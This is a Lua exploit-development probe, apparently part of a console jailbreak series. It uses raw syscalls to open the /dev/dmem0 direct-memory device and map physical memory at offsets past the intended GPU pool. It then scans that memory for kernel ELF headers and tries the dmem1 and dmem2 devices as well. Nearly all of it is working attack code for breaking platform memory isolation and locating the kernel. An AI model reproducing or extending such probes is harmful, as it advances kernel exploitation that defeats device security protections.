-- CRASH_CLASS: LOW
-- PROBE 532e: Systematic dmem0 offset range scan
--
-- 532d showed: offsets 0-0x60000000 work (even past pool).
-- Negative offsets fail. Need to find where the kernel is.
--
-- Strategy: binary-search the max mappable offset, then scan
-- for ELF headers (0x7F "ELF") or FreeBSD kernel signatures.
--
-- Physical memory layout hypothesis:
--   0x000000000 - ~0x100000000: system RAM (kernel somewhere here?)
--   0x100000000 - 0x150000000: dmem0 pool (GPU direct memory)
--   0x150000000+: possibly more system RAM or MMIO
--
-- dmem0 offset 0 = phys 0x100000000.
-- To reach phys 0, we need offset = -(0x100000000) which is impossible
-- as unsigned. BUT: if the driver uses 32-bit offset internally...
--
-- Let's test: what's the maximum offset that works?

print("=== PROBE 532e: DMEM RANGE SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)

-- Open dmem0
local devpath = memory.alloc(32)
zero(devpath, 32)
wd(devpath + 0, 0x7665642F)
wd(devpath + 4, 0x656D642F)
wd(devpath + 8, 0x0000306D)
local sc_open = make_syscall(5)
local ok_o, dmem_fd = pcall(function()
    return sc_open(uint64(devpath), uint64(0x10002), uint64(0))
end)
print("dmem_fd=" .. q(dmem_fd))

-- Helper: try mmap at offset, return VA or nil
local function try_map(offset)
    local ok_m, va = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(1), dmem_fd, offset)
    end)
    if not ok_m then return nil end
    local va_n = to_num(va)
    if va_n < 0 then va_n = va_n + 0x100000000 end
    if va_n == 0 or va_n == 0xFFFFFFFF then return nil end
    -- Check if it's an error return (negative in signed, high bit set)
    local va_h = 0
    if type(va) == "table" and va.h then
        va_h = va.h; if va_h < 0 then va_h = va_h + 0x100000000 end
    end
    if va_h == 0xFFFFFFFF then return nil end
    return va, va_n
end

-- [1] Find max mappable offset
print("")
print("[1] Max offset search")
local test_offsets_high = {
    0x50000000,    -- 532d: works
    0x60000000,    -- 532d: works
    0x80000000,    -- 2 GB past pool
    0xC0000000,    -- 3 GB past pool
    0xF0000000,    -- ~4 GB past pool
}

for _, off_n in ipairs(test_offsets_high) do
    local off = uint64(off_n)
    local va, va_n = try_map(off)
    if va then
        local d = rd(va_n)
        local ds = "0x0"
        if d then
            if d < 0 then d = d + 0x100000000 end
            ds = string.format("0x%08X", d)
        else
            ds = "FAULT"
        end
        print(string.format("  off=0x%08X → VA=%s first_dword=%s", off_n, q(va), ds))
        -- Unmap to save VM space
        pcall(function() sc_munmap(va, uint64(0x4000)) end)
    else
        print(string.format("  off=0x%08X → FAIL", off_n))
    end
end

-- [2] Try larger (64-bit) offsets
print("")
print("[2] Large offset test")
local large_offsets = {
    { name = "1GB",    off = uint64("0x100000000") },
    { name = "2GB",    off = uint64("0x200000000") },
    { name = "4GB",    off = uint64("0x400000000") },
    { name = "8GB",    off = uint64("0x800000000") },
    { name = "16GB",   off = uint64("0x1000000000") },
}
for _, t in ipairs(large_offsets) do
    local va, va_n = try_map(t.off)
    if va then
        local d = rd(va_n)
        local ds = "0x0"
        if d then
            if d < 0 then d = d + 0x100000000 end
            ds = string.format("0x%08X", d)
        else
            ds = "FAULT"
        end
        print(string.format("  %-6s off=%s → VA=%s first=%s", t.name, q(t.off), q(va), ds))
        pcall(function() sc_munmap(va, uint64(0x4000)) end)
    else
        print(string.format("  %-6s off=%s → FAIL", t.name, q(t.off)))
    end
end

-- [3] Scan the accessible range for ELF headers
-- Phys addr = 0x100000000 + offset
-- Scan in 1MB steps from offset 0x50000000 to 0xF0000000
-- Looking for 0x464C457F = "\x7FELF" at page start
print("")
print("[3] ELF header scan (1MB steps, 0x50000000-0xF0000000)")
local elf_count = 0
for off_mb = 0x50, 0xF0 do
    local off = uint64(off_mb * 0x100000)
    local va, va_n = try_map(off)
    if va then
        local d = rd(va_n)
        if d then
            if d < 0 then d = d + 0x100000000 end
            if d == 0x464C457F then
                local phys = uint64("0x100000000") + off
                print(string.format("  *** ELF at off=0x%08X phys=%s ***", off_mb * 0x100000, q(phys)))
                -- Read more header
                local e_type = rd(va_n + 16)
                local e_machine = rd(va_n + 18)
                if e_type then
                    local et = e_type % 0x10000  -- lower 16 bits
                    print(string.format("      e_type=%d e_machine=%d", et, (e_type / 0x10000) % 0x10000))
                end
                elf_count = elf_count + 1
            end
        end
        pcall(function() sc_munmap(va, uint64(0x4000)) end)
    end
end
print("  Found " .. elf_count .. " ELF headers")

-- [4] Also scan near physical 0 — try offsets that would wrap
-- If dmem0 base is 0x100000000, and offset wraps at 32-bit:
-- offset 0xF0000000 → base + offset = 0x1F0000000 (no wrap in 64-bit)
-- Can't reach below 0x100000000 with positive offsets.
--
-- BUT what about other dmem devices? dmem1, dmem2 might have different bases.
print("")
print("[4] Try dmem1/dmem2")
local devpaths = {
    { name = "dmem1", bytes = {0x7665642F, 0x656D642F, 0x0000316D} },
    { name = "dmem2", bytes = {0x7665642F, 0x656D642F, 0x0000326D} },
}
for _, dp in ipairs(devpaths) do
    zero(devpath, 32)
    wd(devpath + 0, dp.bytes[1])
    wd(devpath + 4, dp.bytes[2])
    wd(devpath + 8, dp.bytes[3])
    local ok_d, fd = pcall(function()
        return sc_open(uint64(devpath), uint64(0x10002), uint64(0))
    end)
    local fdn = to_num(fd)
    if fdn < 0 then fdn = fdn + 0x100000000 end
    if ok_d and fdn < 1000 and fdn > 0 then
        print(string.format("  %s fd=%d", dp.name, fdn))
        -- Try mmap offset 0
        local va, va_n = try_map(uint64(0))
        -- Wait, need to use this fd not dmem0 fd
        local ok_m2, va2 = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
                uint64(1), fd, uint64(0))
        end)
        local va2n = to_num(va2)
        if va2n < 0 then va2n = va2n + 0x100000000 end
        local va2h = 0
        if type(va2) == "table" and va2.h then va2h = va2.h; if va2h < 0 then va2h = va2h + 0x100000000 end end
        if ok_m2 and va2h ~= 0xFFFFFFFF and va2n ~= 0 then
            local d = rd(va2n)
            print(string.format("    mmap(off=0)=%s first=%s", q(va2), d and string.format("0x%X", d < 0 and d + 0x100000000 or d) or "FAULT"))
        else
            print(string.format("    mmap(off=0)=FAIL (%s)", q(va2)))
        end
    else
        print(string.format("  %s OPEN_FAIL (rv=%s)", dp.name, q(fd)))
    end
end

print("")
print("=== 532e DONE ===")
